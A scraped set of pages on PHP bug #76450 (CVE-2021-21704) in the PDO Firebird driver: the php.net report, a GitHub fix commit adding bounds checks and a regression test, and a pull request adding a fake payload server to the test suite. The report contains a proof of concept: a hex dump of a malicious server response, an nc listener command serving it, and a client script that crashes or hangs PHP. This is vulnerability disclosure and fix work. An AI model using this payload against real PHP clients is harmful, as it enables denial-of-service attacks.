[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2F67afa32541ebc4abbf633cb1e7e879b2fbb616ad) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from bugs.php.net_dbad869f_20250115_090358.html ===


| [Bugs](/) | [php.net](https://php.net/) |  [support](https://php.net/support.php) |  [documentation](https://php.net/docs.php) |  [report a bug](report.php) |  [advanced search](search.php) |  [search howto](search-howto.php) |  [statistics](stats.php) |  [random bug](random) |  [login](login.php) |
| --- | --- |
| go to bug id or search bugs for | |

| | [Sec Bug](bug.php?id=76450) #76450 | SIGSEGV in firebird\_stmt\_execute | | | | | | --- | --- | --- | --- | --- | --- | | Submitted: | 2018-06-11 20:02 UTC | Modified: | 2021-06-28 04:40 UTC |  | | From: | trichimtrich at gmail dot com | Assigned: | [stas](search.php?cmd=display&assign=stas) ([profile](https://people.php.net/stas)) | | Status: | Closed | Package: | [PDO Firebird](search.php?cmd=display&package_name[]=PDO+Firebird) | | PHP Version: | 7.3.0alpha1 | OS: |  | | Private report: | No | CVE-ID: | [2021-21704](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21704) |   View [Developer](bug.php?id=76450&edit=1) [Edit](bug.php?id=76450&edit=2)   **[2018-06-11 20:02 UTC] trichimtrich at gmail dot com** ``` Description: ------------ A bug in pdo_firebase module allows a malicious firebase server or man-in-the-middle attacker to crash PHP.  bug in the result parsing of "exec procedure" in statement query. the response is not validated before caculation leads to crash or hang php forever.  Vulnerable code in: \php-src\ext\pdo_firebird\firebird_statement.c:   134  				if (result[0] == isc_info_sql_records) {   135: 					unsigned i = 3, result_size = isc_vax_integer(&result[1], 2);   136  					while (result[i] != isc_info_end && i < result_size) {   137: 						short len = (short) isc_vax_integer(&result[i + 1], 2);   138  						if (result[i] != isc_info_req_select_count) {   139: 							affected_rows += isc_vax_integer(&result[i + 3], len);   140  						}   141  						i += len + 3;  result_size is not verified len uses short type, that we can set len = -3 and make PHP hangs forever.   $ ./php --version PHP 7.3.0-dev (cli) (built: Jun  9 2018 04:47:18) ( NTS ) Copyright (c) 1997-2018 The PHP Group Zend Engine v3.3.0-dev, Copyright (c) 1998-2018 Zend Technologies  Test script: --------------- $ xxd stmt_exec_procedure.bin 00000000: 0000 005e ffff 800f 0000 0001 0000 0005  ...^............ 00000010: 0000 0000 0000 000b 4c65 6761 6379 5f41  ........Legacy_A 00000020: 7574 6800 0000 0000 0000 0000 0000 005c  uth............\ 00000030: 0000 0000 0000 000b 4c65 6761 6379 5f41  ........Legacy_A 00000040: 7574 6800 0000 0000 0000 0000 0000 0009  uth............. 00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 00000060: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 00000070: 0000 0001 0000 0000 0000 0000 0000 0000  ................ 00000080: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 00000090: 0000 0002 0000 0000 0000 0000 0000 0000  ................ 000000a0: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 000000b0: 0000 0000 0000 0000 0000 0000 0000 001f  ................ 000000c0: 1504 0008 0000 001b 0400 0200 0000 0507  ................ 000000d0: 0400 0000 0000 0407 0400 0000 0000 0100  ................ 000000e0: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 000000f0: 0000 0001 0000 0000 0000 0000 0000 0000  ................ 00000100: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 00000110: 0000 0002 0000 0000 0000 0000 0000 0021  ...............! 00000120: 17ff ff0f feff 0000 0000 1004 0000 0000  ................ 00000130: 000d 0400 0000 0000 0e04 0000 0000 0002  ................ 00000140: 0100 0000 0000 0001 0000 0000 0000 0000  ................ 00000150: 0000 0009 0000 0000 0000 0000 0000 0000  ................ 00000160: 0000 0000 0000 0001 0000 0000 0000 0000  ................ 00000170: 0000 0009 ffff ffff 0000 0000 0000 0000  ................ 00000180: 0000 0000 0000 0001 0000 0000 0000 0000  ................ 00000190: 0000 0009 0000 0000 0000 0000 0000 0000  ................ 000001a0: 0000 0000 0000 0001 0000 0000 0000 0000  ................ 000001b0: 0000 0009 0000 0000 0000 0000 0000 0000  ................ 000001c0: 0000 0000 0000 0001 0000 0000 0000 0000  ................   $ nc -lvp 3050 < stmt_exec_procedure.bin  $ cat fire_stmt_exec.php <?php $dsn = 'firebird:dbname=localhost:employee;charset=utf8;'; $username = 'SYSDBA'; $password = 'masterkey';  $dbh = new PDO($dsn, $username, $password, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]); $sql = "EXECUTE PROCEDURE test_proc 123"; $query = $dbh->prepare($sql); $query->execute(); ?>  Expected result: ---------------- No crash No hang  Actual result: -------------- $ ./php fire_stmt_exec.php ASAN:DEADLYSIGNAL ================================================================= ==5413==ERROR: AddressSanitizer: stack-overflow on address 0x7ffd68135687 (pc 0x000000cdbf9d bp 0x7ffd6812c1b0 sp 0x7ffd6812c060 T0)     #0 0xcdbf9c in firebird_stmt_execute (/mnt/hgfs/share/htdocs/php+0xcdbf9c)     #1 0xcc55eb in zim_PDOStatement_execute (/mnt/hgfs/share/htdocs/php+0xcc55eb)     #2 0x12e1872 in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER (/mnt/hgfs/share/htdocs/php+0x12e1872)     #3 0x1212bcf in execute_ex (/mnt/hgfs/share/htdocs/php+0x1212bcf)     #4 0x121320b in zend_execute (/mnt/hgfs/share/htdocs/php+0x121320b)     #5 0x11175c0 in zend_execute_scripts (/mnt/hgfs/share/htdocs/php+0x11175c0)     #6 0xfa4878 in php_execute_script (/mnt/hgfs/share/htdocs/php+0xfa4878)     #7 0x1412cc4 in do_cli (/mnt/hgfs/share/htdocs/php+0x1412cc4)     #8 0x1410e67 in main (/mnt/hgfs/share/htdocs/php+0x1410e67)     #9 0x7f4208d6d82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)     #10 0x43d878 in _start (/mnt/hgfs/share/htdocs/php+0x43d878)  SUMMARY: AddressSanitizer: stack-overflow (/mnt/hgfs/share/htdocs/php+0xcdbf9c) in firebird_stmt_execute ==5413==ABORTING   ``` PatchesPull RequestsHistoryAllCommentsChangesGit/SVN commitsRelated reports  **[2018-06-11 20:05 UTC] [stas@php.net](//people.php.net/stas)** -Assigned To: +Assigned To: lwe **[2018-06-11 21:19 UTC] trichimtrich at gmail dot com** ``` PoC hangs PHP  $ xxd stmt_exec_procedure.bin 00000000: 0000 005e ffff 800f 0000 0001 0000 0005  ...^............ 00000010: 0000 0000 0000 000b 4c65 6761 6379 5f41  ........Legacy_A 00000020: 7574 6800 0000 0000 0000 0000 0000 005c  uth............\ 00000030: 0000 0000 0000 000b 4c65 6761 6379 5f41  ........Legacy_A 00000040: 7574 6800 0000 0000 0000 0000 0000 0009  uth............. 00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 00000060: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 00000070: 0000 0001 0000 0000 0000 0000 0000 0000  ................ 00000080: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 00000090: 0000 0002 0000 0000 0000 0000 0000 0000  ................ 000000a0: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 000000b0: 0000 0000 0000 0000 0000 0000 0000 001f  ................ 000000c0: 1504 0008 0000 001b 0400 0200 0000 0507  ................ 000000d0: 0400 0000 0000 0407 0400 0000 0000 0100  ................ 000000e0: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 000000f0: 0000 0001 0000 0000 0000 0000 0000 0000  ................ 00000100: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 00000110: 0000 0002 0000 0000 0000 0000 0000 0021  ...............! 00000120: 17ff ff0f fdff 0000 0000 1004 0000 0000  ................ 00000130: 000d 0400 0000 0000 0e04 0000 0000 0002  ................ 00000140: 0100 0000 0000 0001 0000 0000 0000 0000  ................ 00000150: 0000 0009 0000 0000 0000 0000 0000 0000  ................ 00000160: 0000 0000 0000 0001 0000 0000 0000 0000  ................ 00000170: 0000 0009 ffff ffff 0000 0000 0000 0000  ................ 00000180: 0000 0000 0000 0001 0000 0000 0000 0000  ................ 00000190: 0000 0009 0000 0000 0000 0000 0000 0000  ................ 000001a0: 0000 0000 0000 0001 0000 0000 0000 0000  ................ 000001b0: 0000 0009 0000 0000 0000 0000 0000 0000  ................ 000001c0: 0000 0000 0000 0001 0000 0000 0000 0000  ................  ``` **[2018-06-28 08:31 UTC] trichimtrich at gmail dot com** ``` any update for this one?  ``` **[2021-04-30 12:12 UTC] [cmb@php.net](//people.php.net/cmb)** -Status: Assigned +Status: Verified -Assigned To: lwe +Assigned To: cmb **[2021-05-05 12:54 UTC] [cmb@php.net](//people.php.net/cmb)** -Assigned To: cmb +Assigned To: stas **[2021-05-05 12:54 UTC] [cmb@php.net](//people.php.net/cmb)** ``` Suggested patch: <<https://gist.github.com/cmb69/44a36b067a66f3770b914a7fa88e5086>>.  This requires the payload server[1], and is developed against PHP-7.4.  For PHP-7.3 at least some adjustments need to be done. I can do that, but first would like to confirm that the patch and the testing "framework" are generally acceptable.  Stas, what do you think?  [1] <<https://github.com/php/php-src/pull/6940>>  ``` **[2021-06-21 05:10 UTC] [stas@php.net](//people.php.net/stas)** -CVE-ID: +CVE-ID: 2021-21704 **[2021-06-21 06:22 UTC] [stas@php.net](//people.php.net/stas)** -Private report: No +Private report: Yes **[2021-06-28 04:41 UTC] [git@php.net](//people.php.net/git)** ``` Automatic comment on behalf of cmb69 (author) and smalyshev (committer) Revision: <https://github.com/php/php-src/commit/bcbf8aa0c96d8d9e81ec3428232485555fae0b37> Log: Fix #76450: SIGSEGV in firebird_stmt_execute  ``` **[2021-06-28 04:41 UTC] [git@php.net](//people.php.net/git)** -Status: Verified +Status: Closed |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

|  | |
| --- | --- |
| [PHP](https://php.net/) [Copyright © 2001-2025 The PHP Group](https://php.net/copyright.php) All rights reserved. | Last updated: Wed Jan 15 09:01:28 2025 UTC |



=== Content from github.com_284b7a51_20250115_133634.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2F08da7c73726f7b86b67d6f0ff87c73c585a7834a)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2F08da7c73726f7b86b67d6f0ff87c73c585a7834a)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=php%2Fphp-src)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[php](/php)
/
**[php-src](/php/php-src)**
Public

* [Notifications](/login?return_to=%2Fphp%2Fphp-src) You must be signed in to change notification settings
* [Fork
  7.8k](/login?return_to=%2Fphp%2Fphp-src)
* [Star
   38.5k](/login?return_to=%2Fphp%2Fphp-src)

* [Code](/php/php-src)
* [Issues
  737](/php/php-src/issues)
* [Pull requests
  562](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

Additional navigation options

* [Code](/php/php-src)
* [Issues](/php/php-src/issues)
* [Pull requests](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

## Commit

[Permalink](/php/php-src/commit/08da7c73726f7b86b67d6f0ff87c73c585a7834a)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix #76449: SIGSEGV in firebird\_handle\_doer

[Browse files](/php/php-src/tree/08da7c73726f7b86b67d6f0ff87c73c585a7834a)
Browse the repository at this point in the history

```
We need to verify that the `result_size` is not larger than our buffer,
and also should make sure that the `len` which is passed to
`isc_vax_integer()` has a permissible value; otherwise we bail out.
```

* Loading branch information

[![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=40&v=4)](/cmb69) [![@smalyshev](https://avatars.githubusercontent.com/u/155000?s=40&v=4)](/smalyshev)

[cmb69](/php/php-src/commits?author=cmb69 "View all commits by cmb69")
authored and
[smalyshev](/php/php-src/commits?author=smalyshev "View all commits by smalyshev")
committed
Jun 21, 2021

1 parent
[bcbf8aa](/php/php-src/commit/bcbf8aa0c96d8d9e81ec3428232485555fae0b37)

commit 08da7c7

 Show file tree

 Hide file tree

Showing
**3 changed files**
with
**32 additions**
and
**0 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* ext/pdo\_firebird

  + ext/pdo\_firebird/firebird\_driver.c
    [firebird\_driver.c](#diff-5684d3d61815495ce66588eb12da8a5d1bcf1accf5266f59f85577d3405affeb)
  + tests

    - ext/pdo\_firebird/tests/bug\_76449.data
      [bug\_76449.data](#diff-6b1025d31efce96bcf68be94af519f44de78e53c98ca343362248843a6a8a030)
    - ext/pdo\_firebird/tests/bug\_76449.phpt
      [bug\_76449.phpt](#diff-5c3a00d0a020bb78924dd310ab889de53a5c4d3e3c35de172b16c3636e16036b)

## There are no files selected for viewing

9 changes: 9 additions & 0 deletions

9
[ext/pdo\_firebird/firebird\_driver.c](#diff-5684d3d61815495ce66588eb12da8a5d1bcf1accf5266f59f85577d3405affeb "ext/pdo_firebird/firebird_driver.c")

Show comments

[View file](/php/php-src/blob/08da7c73726f7b86b67d6f0ff87c73c585a7834a/ext/pdo_firebird/firebird_driver.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -206,8 +206,17 @@ static zend\_long firebird\_handle\_doer(pdo\_dbh\_t \*dbh, const char \*sql, size\_t sq |
|  |  | if (result[0] == isc\_info\_sql\_records) { |
|  |  | unsigned i = 3, result\_size = isc\_vax\_integer(&result[1],2); |
|  |  |  |
|  |  | if (result\_size > sizeof(result)) { |
|  |  | ret = -1; |
|  |  | goto free\_statement; |
|  |  | } |
|  |  | while (result[i] != isc\_info\_end && i < result\_size) { |
|  |  | short len = (short)isc\_vax\_integer(&result[i+1],2); |
|  |  | /\* bail out on bad len \*/ |
|  |  | if (len != 1 && len != 2 && len != 4) { |
|  |  | ret = -1; |
|  |  | goto free\_statement; |
|  |  | } |
|  |  | if (result[i] != isc\_info\_req\_select\_count) { |
|  |  | ret += isc\_vax\_integer(&result[i+3],len); |
|  |  | } |
| Expand Down | |  |

Binary file added
BIN
+464 Bytes

[ext/pdo\_firebird/tests/bug\_76449.data](#diff-6b1025d31efce96bcf68be94af519f44de78e53c98ca343362248843a6a8a030 "ext/pdo_firebird/tests/bug_76449.data")

Show comments

[View file](/php/php-src/blob/08da7c73726f7b86b67d6f0ff87c73c585a7834a/ext/pdo_firebird/tests/bug_76449.data)
Edit file

Delete file

Binary file not shown.

23 changes: 23 additions & 0 deletions

23
[ext/pdo\_firebird/tests/bug\_76449.phpt](#diff-5c3a00d0a020bb78924dd310ab889de53a5c4d3e3c35de172b16c3636e16036b "ext/pdo_firebird/tests/bug_76449.phpt")

Show comments

[View file](/php/php-src/blob/08da7c73726f7b86b67d6f0ff87c73c585a7834a/ext/pdo_firebird/tests/bug_76449.phpt)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,23 @@ |
|  |  | --TEST-- |
|  |  | Bug #76449 (SIGSEGV in firebird\_handle\_doer) |
|  |  | --SKIPIF-- |
|  |  | <?php |
|  |  | if (!extension\_loaded('pdo\_firebird')) die("skip pdo\_firebird extension not available"); |
|  |  | if (!extension\_loaded('sockets')) die("skip sockets extension not available"); |
|  |  | ?> |
|  |  | --FILE-- |
|  |  | <?php |
|  |  | require\_once "payload\_server.inc"; |
|  |  |  |
|  |  | $address = run\_server(\_\_DIR\_\_ . "/bug\_76449.data"); |
|  |  |  |
|  |  | // no need to change the credentials; we're running against a fake server |
|  |  | $dsn = "firebird:dbname=inet://$address/test"; |
|  |  | $username = 'SYSDBA'; |
|  |  | $password = 'masterkey'; |
|  |  |  |
|  |  | $dbh = new PDO($dsn, $username, $password, [PDO::ATTR\_ERRMODE => PDO::ERRMODE\_EXCEPTION]); |
|  |  | var\_dump($dbh->exec("INSERT INTO test VALUES ('hihi2', 'xxxxx')")); |
|  |  | ?> |
|  |  | --EXPECT-- |
|  |  | bool(false) |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `08da7c7`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2F08da7c73726f7b86b67d6f0ff87c73c585a7834a) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_77d8b578_20250115_133642.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fpull%2F6940)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fpull%2F6940)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=php%2Fphp-src)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[php](/php)
/
**[php-src](/php/php-src)**
Public

* [Notifications](/login?return_to=%2Fphp%2Fphp-src) You must be signed in to change notification settings
* [Fork
  7.8k](/login?return_to=%2Fphp%2Fphp-src)
* [Star
   38.5k](/login?return_to=%2Fphp%2Fphp-src)

* [Code](/php/php-src)
* [Issues
  737](/php/php-src/issues)
* [Pull requests
  562](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

Additional navigation options

* [Code](/php/php-src)
* [Issues](/php/php-src/issues)
* [Pull requests](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fphp%2Fphp-src%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fphp%2Fphp-src%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Add simple Firebird payload fake server to test suite #6940

 Closed

[cmb69](/cmb69)
wants to merge
2
commits into
[php:PHP-7.4](/php/php-src/tree/PHP-7.4 "php/php-src:PHP-7.4")
from
[cmb69:cmb/fb-payload-server](/cmb69/php-src/tree/cmb/fb-payload-server "cmb69/php-src:cmb/fb-payload-server")

 Closed

# [Add simple Firebird payload fake server to test suite](#top) #6940

[cmb69](/cmb69)
wants to merge
2
commits into
[php:PHP-7.4](/php/php-src/tree/PHP-7.4 "php/php-src:PHP-7.4")
from
[cmb69:cmb/fb-payload-server](/cmb69/php-src/tree/cmb/fb-payload-server "cmb69/php-src:cmb/fb-payload-server")

[Conversation
5](/php/php-src/pull/6940)
[Commits
2](/php/php-src/pull/6940/commits)
[Checks
0](/php/php-src/pull/6940/checks)
[Files changed](/php/php-src/pull/6940/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![cmb69](https://avatars.githubusercontent.com/u/2306138?s=60&v=4)](/cmb69)

Copy link

Member

### @cmb69 **[cmb69](/cmb69)** commented [May 4, 2021](#issue-875581883)

This is meant to test against certain fixed responses of FireBird

servers. For now we add just a most basic test which verifies a

connection attempt.

Sorry, something went wrong.

All reactions

 [cmb69](/cmb69)
added 2 commits
[May 4, 2021 17:28](#commits-pushed-a0cb252)

[![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=40&v=4)](/cmb69)

`[Add simple Firebird payload fake server to test suite](/php/php-src/pull/6940/commits/a0cb252cb54094137435ba843cf9064f19e69403 "Add simple Firebird payload fake server to test suite

This is meant to test against certain fixed responses of FireBird
servers.  For now we add just a most basic test which verifies a
connection attempt.")`
 …

`[a0cb252](/php/php-src/pull/6940/commits/a0cb252cb54094137435ba843cf9064f19e69403)`

```
This is meant to test against certain fixed responses of FireBird
servers.  For now we add just a most basic test which verifies a
connection attempt.
```

[![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=40&v=4)](/cmb69)

`[Add missing skipif clause](/php/php-src/pull/6940/commits/98aeabcd18224de70d6167d6f554923e3ed51eb5 "Add missing skipif clause

We also fix a typo in a comment.")`
 …

`[98aeabc](/php/php-src/pull/6940/commits/98aeabcd18224de70d6167d6f554923e3ed51eb5)`

```
We also fix a typo in a comment.
```

[![@smalyshev](https://avatars.githubusercontent.com/u/155000?s=80&v=4)](/smalyshev)

Copy link

Contributor

### **[smalyshev](/smalyshev)** commented [May 6, 2021](#issuecomment-833232666)

| Didn't test it but the idea looks fine for me, if we have ways to capture correct payloads. |
| --- |

All reactions

Sorry, something went wrong.

[![@nikic](https://avatars.githubusercontent.com/u/216080?s=80&v=4)](/nikic)

Copy link

Member

### **[nikic](/nikic)** commented [May 6, 2021](#issuecomment-833304601)

| What's the context for this? |
| --- |

All reactions

Sorry, something went wrong.

[![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=80&u=7ec59f5ef95aa5b3f78fa7c0556425e44feb97e9&v=4)](/cmb69)

Copy link

Member

Author

### **[cmb69](/cmb69)** commented [May 6, 2021](#issuecomment-833388295)

| […], , if we have ways to capture correct payloads.  The payload for the test in this patch has been sniffed with Wireshark (a bit fiddly, since suport for gdsdb isn't as good as for mysql, for instance, but doable).  What's the context for this?  It's mostly about malicious payloads. |
| --- |

All reactions

Sorry, something went wrong.

[![nikic](https://avatars.githubusercontent.com/u/216080?s=60&v=4)](/nikic)

**[nikic](/nikic)**
approved these changes
[May 6, 2021](#pullrequestreview-653236421)

 [View reviewed changes](/php/php-src/pull/6940/files/98aeabcd18224de70d6167d6f554923e3ed51eb5)

Copy link

Member

### @nikic **[nikic](/nikic)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

This looks okay to me. You might want to test it against master, as I don't think we compile PDO firebird on 7.4.

Sorry, something went wrong.

All reactions

